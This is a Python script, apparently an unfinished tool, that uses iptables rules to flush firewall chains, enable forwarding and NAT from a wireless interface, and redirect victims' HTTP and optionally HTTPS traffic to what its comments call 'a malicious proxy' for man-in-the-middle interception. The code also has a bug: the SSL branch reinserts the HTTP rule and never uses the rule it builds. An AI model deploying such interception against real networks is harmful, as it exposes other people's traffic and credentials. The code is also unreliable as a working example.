#!/usr/bin/python
import iptc

# Turn down for what?
mitm_ssl = True

#set internet and wlan interfaces so we can set up nat, proxy
internetif = "eth0"
lanif = "wlan0"

# to forward all traffic to a malicious proxy
dst_ip = "10.1.1.1"
dst_port = "8080"


def enable_nat(internetif = "eth0",lanif = "wlan0",dst_ip = "10.1.1.1",dst_port = "8080",mitm_ssl = True):

    INPUT_Chain = iptc.Chain(iptc.Table(iptc.Table.FILTER), "INPUT")
    OUTPUT_Chain = iptc.Chain(iptc.Table(iptc.Table.FILTER), "OUTPUT")
    FORWARD_Chain = iptc.Chain(iptc.Table(iptc.Table.FILTER),"FORWARD")
    POSTROUTE_Chain = iptc.Chain(iptc.Table(iptc.Table.NAT), "POSTROUTING")
    PREROUTE_Chain = iptc.Chain(iptc.Table(iptc.Table.NAT), "PREROUTING")
    
    INPUT_Chain.flush()
    OUTPUT_Chain.flush()
    FORWARD_Chain.flush()
    POSTROUTE_Chain.flush()
    
    # set the forwarding to true
    try:
        with open('/proc/sys/net/ipv4/ip_forward','w') as fwfile:
            fwfile.write('1')
    except:
        print "Could not write to /proc/sys/net/ipv4/ip_forward"
    
    
    # loopback rule - accept all the things
    lo_rule = iptc.Rule()
    lo_rule.in_interface = "lo"
    lo_target = iptc.Target(lo_rule,"ACCEPT")
    lo_rule.target = lo_target
    INPUT_Chain.insert_rule(lo_rule)
    #slightly mod, then use in the output chain too
    del lo_rule
    
    lo_rule = iptc.Rule()
    lo_rule.out_interface = "lo"
    lo_target = iptc.Target(lo_rule,"ACCEPT")
    lo_rule.target = lo_target
    OUTPUT_Chain.insert_rule(lo_rule)
    
    #LAN-side rules
    #iptables -A INPUT -i $lan -j ACCEPT
    lan_rule = iptc.Rule()
    lan_rule.in_interface = lanif
    lan_rule.target = iptc.Target(lan_rule,"ACCEPT")
    INPUT_Chain.insert_rule(lan_rule)
    del lan_rule
    
    #iptables -A OUTPUT -o $lan -j ACCEPT
    lan_rule = iptc.Rule()
    lan_rule.out_interface = lanif
    lan_rule.target = iptc.Target(lan_rule,"ACCEPT")
    OUTPUT_Chain.insert_rule(lan_rule)
    del lan_rule
    
    #iptables -A FORWARD -i $internet -o $lan -j ACCEPT
    lan_rule = iptc.Rule()
    lan_rule.out_interface = internetif
    lan_rule.in_interface = lanif
    lan_rule.target = iptc.Target(lan_rule,"ACCEPT")
    FORWARD_Chain.insert_rule(lan_rule)
    
    #iptables -A FORWARD -i $lan -o $internet -j ACCEPT
    lan_rule.out_interface = lanif
    lan_rule.in_interface = internetif
    FORWARD_Chain.insert_rule(lan_rule)
    
    #iptables -A POSTROUTING -t nat -o $internet -j MASQUERADE
    # I think that this works because the -t nat is in the postrouting chain?
    route_rule = iptc.Rule()
    route_rule.out_interface = internetif
    route_rule.target = iptc.Target(route_rule,"MASQUERADE")
    POSTROUTE_Chain.insert_rule(route_rule)
    
    #iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination.......
    # check https://github.com/ldx/python-iptables/issues/122 for more info
    proxy_rule = iptc.Rule()
    proxy_rule.protocol = 'tcp'
    proxy_rule.in_interface = lanif
    m = proxy_rule.create_match('tcp')
    m.dport = '80'
    t = proxy_rule.create_target('DNAT')
    t.to_destination = dst_ip+':'+dst_port
    PREROUTE_Chain.insert_rule(proxy_rule)
    
    
    # MITM'd SSL is loud -- the user should confirm that they want to do this
    #iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
    if mitm_ssl == True:
        ssl_rule = iptc.Rule()
        ssl_rule.protocol = "tcp"
        m = ssl_rule.create_match('tcp')
        m.dport = '443'
        t = ssl_rule.create_target('DNAT')
        t.to_destination = dst_ip+':'+dst_port
        PREROUTE_Chain.insert_rule(proxy_rule)
    # we actually need to be able to set up arbitrary rules for forwarding non-443 SSL traffic to MITMProxy at some point
    # Additionally, we need the ability to create rules for non-HTTP SSL traffic to be MITM'd anyways
    # This script is far from complete
    
    
